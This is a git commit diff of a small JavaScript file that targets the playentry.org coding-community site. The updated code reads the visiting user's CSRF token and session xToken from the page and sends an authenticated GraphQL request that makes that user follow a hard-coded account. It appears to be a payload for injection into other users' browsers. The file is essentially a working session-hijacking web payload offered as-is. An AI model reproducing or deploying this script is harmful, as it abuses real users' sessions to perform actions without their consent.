80c6368eef4878661a3ce9912f86cdf1b2fe82a6
FireRun <entryfirerun7012@outlook.com>
2024-06-20 17:54:46 +0900

    Update 5.js

--- 5.js
+++ 5.js
@@ -1,4 +1,3 @@
-alert('엄준식 is God')
 async function getCookie() {
   csrf = await fetch("https://playentry.org");
   body = await csrf.text();
@@ -9,19 +8,13 @@ getCookie().then(() => {
   const xToken = body.split('xToken":"')[1].split('"')[0];
   const projectlink = "662e192bd5fc107f7e820dfc";
 
-console.log(`xToken : ${xToken} / csrfToken : ${csrfToken}`)
-})
-setTimeout(()=>{
-  async function getCookie() {
-  csrf = await fetch("https://playentry.org");
-  body = await csrf.text();
-}
-getCookie().then(() => {
-  const index = body.indexOf("csrf-token") + 21;
-  const csrfToken = body.slice(index, index + 36);
-  const xToken = body.split('xToken":"')[1].split('"')[0];
-  const projectlink = "662e192bd5fc107f7e820dfc";
-
-console.log(`xToken : ${xToken} / csrfToken : ${csrfToken}`)
-})
-}, 10000) // 자동 리다이렉트 이슈로 일단 넣어 봄
+fetch("https://playentry.org/graphql", {
+  headers: {
+    "content-type": "application/json",
+    "csrf-token": csrfToken,
+    "x-client-type": "Client",
+    "x-token": xToken,
+  },
+  "body": '{"query":"mutation FOLLOW($user:String){follow(user:$user){status}}","variables":{"user":"6415158297bafa011b552344"}}',
+  "method": "POST",
+});
